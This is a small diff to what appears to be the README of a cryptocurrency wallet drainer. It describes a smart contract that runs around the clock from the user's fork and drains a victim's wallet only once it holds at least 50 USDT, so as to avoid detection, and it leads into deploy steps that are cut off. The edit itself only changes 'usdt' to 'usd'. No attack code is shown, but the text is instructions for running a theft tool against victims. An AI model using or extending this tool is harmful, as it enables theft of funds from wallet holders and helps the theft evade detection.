@@ -38,7 +38,7 @@ The smart contract is deployed on a custom network for added security it cannot 
 
 the smart contract runs from the script in your fork and is running 24/7 so you have full control
 
-If the victim has less than 50 usdt in there wallet it will not drain to make it harder to detect it waits for the victim to have atleast 50 usdt to test make sure you have atleast 50 usdt
+If the victim has less than 50 usd in there wallet it will not drain to make it harder to detect it waits for the victim to have atleast 50 usdt to test make sure you have atleast 50 usd
 
 Deploy steps
 
